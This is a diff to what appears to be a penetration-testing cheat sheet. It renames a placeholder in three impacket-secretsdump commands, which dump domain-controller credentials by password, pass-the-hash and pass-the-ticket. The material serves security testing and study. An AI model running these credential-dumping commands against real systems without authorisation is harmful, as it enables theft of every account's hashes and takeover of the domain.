@@ -66,18 +66,18 @@ impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extra
 ## secretsdump - plaintext password
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump -dc-ip <DC_IP> '<DOMAIN>'/'<USER>':'<PASSWORD>'@'$<DC_HOST>'
+impacket-secretsdump -dc-ip <DC-IP> '<DOMAIN>'/'<USER>':'<PASSWORD>'@'$<DC_HOST>'
 ```
 
 ## secretsdump - Pass-the-Hash
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump -hashes :'<HASH>' -dc-ip '<DC_IP>' '<DOMAIN>'/'<USER>'@'<DC_HOST>'
+impacket-secretsdump -hashes :'<HASH>' -dc-ip '<DC-IP>' '<DOMAIN>'/'<USER>'@'<DC_HOST>'
 ```
 
 ## secretsdump - with Pass-the-Ticket
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass -dc-ip '<DC_IP>' @'<DC_HOST>'
+KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass -dc-ip '<DC-IP>' @'<DC_HOST>'
 ```
 
